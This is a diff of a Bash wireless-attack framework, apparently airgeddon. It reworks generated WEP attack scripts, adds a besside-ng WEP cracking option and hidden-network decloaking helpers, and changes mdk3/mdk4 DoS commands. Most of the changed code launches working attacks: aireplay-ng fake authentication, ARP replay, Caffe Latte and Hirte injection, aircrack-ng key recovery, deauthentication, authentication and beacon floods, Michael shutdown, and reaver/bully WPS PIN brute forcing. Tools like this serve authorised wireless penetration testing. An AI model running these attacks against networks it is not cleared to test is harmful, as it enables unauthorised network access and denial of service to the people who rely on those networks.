-			wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_script_capture_pid}$" 2> /dev/null)
-			wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fakeauth_pid}$" 2> /dev/null)
+			wep_capture_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_script_capture_pid}$" 2> /dev/null)
+			wep_fakeauth_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fakeauth_pid}$" 2> /dev/null)
 
-			if [[ -n "${wep_capture_pid_alive}" ]] && [[ -z "${wep_fakeauth_pid_alive}" ]]; then
-	EOF
-
-	cat >&6 <<-EOF
-				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+			if [[ -n "\${wep_capture_pid_alive}" ]] && [[ -z "\${wep_fakeauth_pid_alive}" ]]; then
+				manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
 					wep_fakeauth_pid="\${global_process_pid}"
 					global_process_pid=""
 				else
-					wep_fakeauth_pid=\$!
+					wep_fakeauth_pid="\$!"
 				fi
-	EOF
 
-	cat >&6 <<-'EOF'
-				wep_script_processes+=(${wep_fakeauth_pid})
+				wep_script_processes+=("\${wep_fakeauth_pid}")
 				write_wep_processes
 				sleep 2
 			fi
 
-			if [ "${wep_to_be_launched_only_once}" -eq 0 ]; then
+			if [ "\${wep_to_be_launched_only_once}" -eq 0 ]; then
 				wep_to_be_launched_only_once=1
-	EOF
 
-	cat >&6 <<-EOF
-				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
+				manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
 					wep_script_processes+=("\${global_process_pid}")
@@ -4183,7 +4125,7 @@ function set_wep_script() {
 					wep_script_processes+=(\$!)
 				fi
 
-				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
 					wep_script_processes+=("\${global_process_pid}")
@@ -4192,7 +4134,7 @@ function set_wep_script() {
 					wep_script_processes+=(\$!)
 				fi
 
-				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
 					wep_script_processes+=("\${global_process_pid}")
@@ -4201,61 +4143,50 @@ function set_wep_script() {
 					wep_script_processes+=(\$!)
 				fi
 
-				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
+				manage_output "+j -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
 					wep_script_processes+=("\${global_process_pid}")
 					global_process_pid=""
 				else
-					wep_script_processes+=(\$!)
+					wep_script_processes+=("\$!")
 				fi
-	EOF
 
-	cat >&6 <<-'EOF'
 				write_wep_processes
 			fi
 
-			if [ "${wep_fragmentation_phase}" -lt 4 ]; then
+			if [ "\${wep_fragmentation_phase}" -lt 4 ]; then
 				wep_fragmentation_attack
 			fi
 
-			if [ "${wep_chopchop_phase}" -lt 4 ]; then
+			if [ "\${wep_chopchop_phase}" -lt 4 ]; then
 				wep_chopchop_attack
 			fi
-	EOF
 
-	cat >&6 <<-EOF
 			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
-	EOF
+			ivs_cmd+="| awk '{print \\\$11}' FS=',' | sed 's/ //g'"
 
-	cat >&6 <<-'EOF'
-			ivs_cmd+="| awk '{print \$11}' FS=',' | sed 's/ //g'"
-
-			current_ivs=$(eval "${ivs_cmd}")
-			if [[ "${current_ivs}" -ge 5000 ]] && [[ "${wep_aircrack_launched}" -eq 0 ]]; then
+			current_ivs=\$(eval "\${ivs_cmd}")
+			if [[ "\${current_ivs}" -ge 5000 ]] && [[ "\${wep_aircrack_launched}" -eq 0 ]]; then
 				wep_aircrack_launched=1
-	EOF
 
-	cat >&6 <<-EOF
-				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
+				manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
 				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
 					wep_aircrack_pid="\${global_process_pid}"
 					global_process_pid=""
 				else
-					wep_aircrack_pid=\$!
+					wep_aircrack_pid="\$!"
 				fi
-	EOF
 
-	cat >&6 <<-'EOF'
-				wep_script_processes+=(${wep_aircrack_pid})
+				wep_script_processes+=("\${wep_aircrack_pid}")
 				write_wep_processes
 			fi
 
-			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_aircrack_pid}$" 2> /dev/null)
-			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ "${wep_aircrack_launched}" -eq 1 ]]; then
+			wep_aircrack_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_aircrack_pid}$" 2> /dev/null)
+			if [[ -z "\${wep_aircrack_pid_alive}" ]] && [[ "\${wep_aircrack_launched}" -eq 1 ]]; then
 				break
-			elif [[ -z "${wep_capture_pid_alive}" ]]; then
+			elif [[ -z "\${wep_capture_pid_alive}" ]]; then
 				break
 			fi
 		done
@@ -4461,13 +4392,13 @@ function launch_dos_pursuit_mode_attack() {
 				global_process_pid=""
 			fi
 		;;
-		"wids / wips / wds confusion attack")
-			dos_delay=10
+		"auth dos attack")
+			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -4483,13 +4414,13 @@ function launch_dos_pursuit_mode_attack() {
 				global_process_pid=""
 			fi
 		;;
-		"auth dos attack")
-			dos_delay=1
+		"wids / wips / wds confusion attack")
+			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -4528,13 +4459,13 @@ function launch_dos_pursuit_mode_attack() {
 				global_process_pid=""
 			fi
 		;;
-		"Wds Confusion")
+		"Auth DoS")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -4758,7 +4689,7 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
 		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
 	fi
 }
@@ -4786,8 +4717,8 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
-		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack" "active"
+		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 	fi
 }
 
@@ -4814,7 +4745,7 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
 		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
 	fi
 }
@@ -5260,8 +5191,8 @@ function michael_shutdown_option() {
 	exec_michaelshutdown
 }
 
-#Validate wep all-in-one attack parameters
-function wep_option() {
+#Validate wep all-in-one and besside-ng attacks parameters
+function wep_attack_option() {
 
 	debug_print
 
@@ -5292,7 +5223,11 @@ function wep_option() {
 	manage_wep_log
 	language_strings "${language}" 115 "read"
 
-	exec_wep_allinone_attack
+	if [ "${1}" = "allinone" ]; then
+		exec_wep_allinone_attack
+	else
+		exec_wep_besside_attack
+	fi
 }
 
 #Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
@@ -5743,7 +5678,8 @@ function initialize_menu_options_dependencies() {
 	bully_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[15]}")
 	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[13]}" "${optional_tools_names[15]}")
 	et_sniffing_sslstrip2_beef_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
-	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
+	wep_attack_allinone_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
+	wep_attack_besside_dependencies=("${optional_tools_names[27]}")
 	enterprise_attack_dependencies=("${optional_tools_names[19]}" "${optional_tools_names[20]}" "${optional_tools_names[22]}")
 	asleap_attacks_dependencies=("${optional_tools_names[20]}")
 	john_attacks_dependencies=("${optional_tools_names[21]}")
@@ -5829,10 +5765,10 @@ function initialize_menu_and_print_selections() {
 			enterprise_asleap_challenge=""
 			enterprise_asleap_response=""
 		;;
-		"handshake_pmkid_tools_menu")
+		"handshake_pmkid_decloaking_tools_menu")
 			print_iface_selected
 			print_all_target_vars
-			return_to_handshake_pmkid_tools_menu=0
+			return_to_handshake_pmkid_decloaking_tools_menu=0
 		;;
 		"dos_attacks_menu")
 			enterprise_mode=""
@@ -5841,7 +5777,7 @@ function initialize_menu_and_print_selections() {
 			print_iface_selected
 			print_all_target_dos_attacks_menu_vars
 		;;
-		"dos_handshake_menu")
+		"dos_handshake_decloak_menu")
 			print_iface_selected
 			print_all_target_vars
 		;;
@@ -5990,6 +5926,7 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
 		rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
+		rm -rf "${tmpdir}decloak"* > /dev/null 2>&1
 		rm -rf "${tmpdir}pmkid"* > /dev/null 2>&1
 		rm -rf "${tmpdir}nws"* > /dev/null 2>&1
 		rm -rf "${tmpdir}clts"* > /dev/null 2>&1
@@ -6027,6 +5964,11 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
 		rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
 		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
+		rm -rf "${tmpdir}decloak.log" > /dev/null 2>&1
 	fi
 
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
@@ -6208,19 +6150,19 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[dos_hints|${randomhint}]}
 		;;
-		"handshake_pmkid_tools_menu")
-			store_array hints handshake_pmkid_hints "${handshake_pmkid_hints[@]}"
-			hintlength=${#handshake_pmkid_hints[@]}
+		"handshake_pmkid_decloaking_tools_menu")
+			store_array hints handshake_pmkid_decloaking_hints "${handshake_pmkid_decloaking_hints[@]}"
+			hintlength=${#handshake_pmkid_decloaking_hints[@]}
 			((hintlength--))
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
-			strtoprint=${hints[handshake_pmkid_hints|${randomhint}]}
+			strtoprint=${hints[handshake_pmkid_decloaking_hints|${randomhint}]}
 		;;
-		"dos_handshake_menu")
-			store_array hints dos_handshake_hints "${dos_handshake_hints[@]}"
-			hintlength=${#dos_handshake_hints[@]}
+		"dos_handshake_decloak_menu")
+			store_array hints dos_handshake_decloak_hints "${dos_handshake_decloak_hints[@]}"
+			hintlength=${#dos_handshake_decloak_hints[@]}
 			((hintlength--))
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
-			strtoprint=${hints[dos_handshake_hints|${randomhint}]}
+			strtoprint=${hints[dos_handshake_decloak_hints|${randomhint}]}
 		;;
 		"decrypt_menu")
 			store_array hints decrypt_hints "${decrypt_hints[@]}"
@@ -6532,7 +6474,7 @@ function main_menu() {
 			dos_attacks_menu
 		;;
 		5)
-			handshake_pmkid_tools_menu
+			handshake_pmkid_decloaking_tools_menu
 		;;
 		6)
 			decrypt_menu
@@ -7419,7 +7361,8 @@ function wep_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 423 wep_attack_dependencies[@]
+	language_strings "${language}" 423 wep_attack_allinone_dependencies[@]
+	language_strings "${language}" 723 wep_attack_besside_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " wep_option
@@ -7443,7 +7386,14 @@ function wep_attacks_menu() {
 			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				wep_option
+				wep_attack_option "allinone"
+			fi
+		;;
+		6)
+			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				wep_attack_option "besside"
 			fi
 		;;
 		*)
@@ -7901,6 +7851,56 @@ function check_valid_file_to_clean() {
 	fi
 
 	return 0
+}
+
+#Check if an essid is present on the mdk3/mdk4 log file to know if it is decloaked for that bssid
+function check_essid_in_mdk_decloak_log() {
+
+	debug_print
+
+	local regexp
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		if ! grep -q "End of SSID list reached" "${tmpdir}decloak.log"; then
+			regexp='SSID:[[:blank:]]\"([^\"]+)\"'
+			[[ $(grep "${bssid}" "${tmpdir}decloak.log") =~ ${regexp} ]] && essid="${BASH_REMATCH[1]}"
+		fi
+	else
+		regexp="Probe[[:blank:]]Response[[:blank:]]from[[:blank:]]target[[:blank:]]AP[[:blank:]]with[[:blank:]]SSID[[:blank:]]+([^[:blank:]]+.*[^[:blank:]]|[^[:blank:]])"
+		[[ $(grep -m 1 "Probe Response from target AP with SSID" "${tmpdir}decloak.log") =~ ${regexp} ]] && essid="${BASH_REMATCH[1]}"
+	fi
+
+	if [ "${essid}" = "(Hidden Network)" ]; then
+		return 1
+	else
+		return 0
+	fi
+}
+
+#Check if an essid is present on a capture file to know if it is decloaked for that bssid
+function check_essid_in_capture_file() {
+
+	debug_print
+
+	while IFS=, read -r exp_bssid _ _ _ _ _ _ _ _ _ _ _ _ exp_essid _; do
+
+		chars_bssid=${#exp_bssid}
+		if [ "${chars_bssid}" -ge 17 ]; then
+			if [ "${exp_bssid}" = "${bssid}" ]; then
+					exp_essid="${exp_essid#"${exp_essid%%[![:space:]]*}"}"
+					exp_essid="${exp_essid%"${exp_essid##*[![:space:]]}"}"
+				if [[ -n "${exp_essid}" ]] && [[ ${exp_essid} != "" ]]; then
+					essid="${exp_essid}"
+					break
+				fi
+			fi
+		fi
+	done < "${tmpdir}decloak-01.csv"
+
+	if [ "${essid}" = "(Hidden Network)" ]; then
+		return 1
+	else
+		return 0
+	fi
 }
 
 #Check if a bssid is present on a capture file to know if there is a Handshake/PMKID with that bssid
@@ -8770,6 +8770,55 @@ function manage_asleap_pot() {
 	fi
 }
 
+#Check if the wep besside password was captured and manage to save it on a file
+function manage_wep_besside_pot() {
+
+	debug_print
+
+	local wep_besside_pass_cracked=0
+	if grep -q "Got key" "${tmpdir}${wep_besside_log}" 2> /dev/null; then
+		sed -ri '1,/Got key/{/Got key/!d; s/.*(Got key)/\1/}' "${tmpdir}${wep_besside_log}" 2> /dev/null
+		readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wep_besside_log}" 2> /dev/null)
+		for item in "${LINES_TO_PARSE[@]}"; do
+			if [[ "${item}" =~ Got[[:blank:]]key[[:blank:]]for.*\[([0-9A-F:]+)\].*IVs ]]; then
+				wep_hex_key="${BASH_REMATCH[1]}"
+				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
+				wep_besside_pass_cracked=1
+				break
+			fi
+		done
+	fi
+
+	if [ "${wep_besside_pass_cracked}" -eq 1 ]; then
+		echo "" > "${weppotenteredpath}"
+		{
+		date +%Y-%m-%d
+		echo -e "${wep_texts[${language},1]}"
+		echo ""
+		echo -e "BSSID: ${bssid}"
+		echo -e "${wep_texts[${language},2]}: ${channel}"
+		echo -e "ESSID: ${essid}"
+		echo ""
+		echo "---------------"
+		echo ""
+		echo -e "ASCII: ${wep_ascii_key}"
+		echo -en "${wep_texts[${language},3]}:"
+		echo -en " ${wep_hex_key}"
+		echo ""
+		echo ""
+		echo "---------------"
+		echo ""
+		echo "${footer_texts[${language},0]}"
+		} >> "${weppotenteredpath}"
+
+		echo
+		language_strings "${language}" 162 "yellow"
+		echo
+		language_strings "${language}" 724 "blue"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Check if the passwords were captured using ettercap and manage to save them on a file
 function manage_ettercap_log() {
 
@@ -8832,7 +8881,7 @@ function manage_wps_log() {
 	done
 }
 
-#Check if the password was captured using wep all-in-one attack and manage to save it on a file
+#Check if the password was captured using wep all-in-one or besside-ng attack and manage to save it on a file
 function manage_wep_log() {
 
 	debug_print
@@ -10237,7 +10286,7 @@ function launch_dhcp_server() {
 	esac
 
 	rm -rf "/var/run/${dhcpd_pid_file}" 2> /dev/null
-	manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
+	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		et_processes+=($!)
 	else
@@ -10265,8 +10314,8 @@ function exec_et_deauth() {
 		"Aireplay")
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
-		"Wds Confusion")
-			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+		"Auth DoS")
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
 		;;
 	esac
 
@@ -10294,7 +10343,7 @@ function exec_et_deauth() {
 		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
 		pid_control_pursuit_mode "${et_dos_attack}" &
 	else
-		manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
 		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 			et_processes+=($!)
 		else
@@ -10324,6 +10373,7 @@ function set_wps_attack_script() {
 
 	wps_attack_tool="${1}"
 	wps_attack_mode="${2}"
+	local unbuffer
 	if [ "${wps_attack_tool}" = "reaver" ]; then
 		unbuffer=""
 		case ${wps_attack_mode} in
@@ -10359,6 +10409,7 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
+
 		script_wps_attack_tool="${wps_attack_tool}"
 		script_wps_attack_mode="${wps_attack_mode}"
 		attack_pin_counter=1
@@ -10368,13 +10419,8 @@ function set_wps_attack_script() {
 		script_bully_reaver_band_modifier="${bully_reaver_band_modifier}"
 		colorize="${colorize}"
 		user_homedir="${user_homedir}"
-	EOF
 
-	cat >&7 <<-'EOF'
-		case ${script_wps_attack_mode} in
-	EOF
-
-	cat >&7 <<-EOF
+		case "\${script_wps_attack_mode}" in
 			"pindb")
 				script_pins_found=(${pins_found[@]})
 				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
@@ -10403,37 +10449,33 @@ function set_wps_attack_script() {
 		pin_header3="${white_color})${normal_color}"
 		script_attack_cmd2="${attack_cmd2}"
 
-	EOF
-
-	cat >&7 <<-'EOF'
+		#Delete the existing bully session files
 		function clear_bully_session_files() {
-			rm -rf ${user_homedir}.bully/*.run > /dev/null 2>&1
+
+			rm -rf "\${user_homedir}.bully/"*.run > /dev/null 2>&1
+			rm -rf "\${user_homedir}.bully/"*.pins > /dev/null 2>&1
 		}
 
+		#Delete the existing reaver session files
 		function clear_reaver_session_files() {
-			rm -rf /var/lib/reaver/*.wpc > /dev/null 2>&1
-			rm -rf /var/lib/lib/reaver/*.wpc > /dev/null 2>&1
-			rm -rf /etc/reaver/*.wpc > /dev/null 2>&1
+
+			rm -rf "/var/lib/reaver/"*.wpc > /dev/null 2>&1
+			rm -rf "/var/lib/lib/reaver/"*.wpc > /dev/null 2>&1
+			rm -rf "/etc/reaver/"*.wpc > /dev/null 2>&1
 		}
 
+		#Check if the password was obtained through the wps pin
 		function manage_wps_pot() {
-			if [ -n "${2}" ]; then
-				trophy_pin="${2}"
+
+			if [ -n "\${2}" ]; then
+				trophy_pin="\${2}"
 			else
 				trophy_pin="Null"
 			fi
-	EOF
 
-	cat >&7 <<-EOF
 			echo "" > "${wpspotenteredpath}"
 			{
-	EOF
-
-	cat >&7 <<-'EOF'
 			date +%Y-%m-%d
-	EOF
-
-	cat >&7 <<-EOF
 			echo -e "${wps_texts[${language},1]}"
 			echo ""
 			echo -e "BSSID: ${wps_bssid}"
@@ -10442,15 +10484,9 @@ function set_wps_attack_script() {
 			echo ""
 			echo "---------------"
 			echo ""
-	EOF
-
-	cat >&7 <<-'EOF'
-			echo -e "PIN: ${trophy_pin}"
-			echo -e "${1}"
+			echo -e "PIN: \${trophy_pin}"
+			echo -e "\${1}"
 			echo ""
-	EOF
-
-	cat >&7 <<-EOF
 			echo "---------------"
 			echo ""
 			echo "${footer_texts[${language},0]}"
@@ -10464,11 +10500,9 @@ function set_wps_attack_script() {
 		function parse_output() {
 
 			readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wps_out_file}" 2> /dev/null)
-	EOF
 
-	cat >&7 <<-'EOF'
-			if [ "${script_wps_attack_tool}" = "reaver" ]; then
-				case ${script_wps_attack_mode} in
+			if [ "\${script_wps_attack_tool}" = "reaver" ]; then
+				case "\${script_wps_attack_mode}" in
 					"pindb"|"custompin"|"bruteforce"|"nullpin")
 						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
 						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
@@ -10482,7 +10516,7 @@ function set_wps_attack_script() {
 					;;
 				esac
 			else
-				case ${script_wps_attack_mode} in
+				case "\${script_wps_attack_mode}" in
 					"pindb"|"custompin"|"bruteforce")
 						failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
 						success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
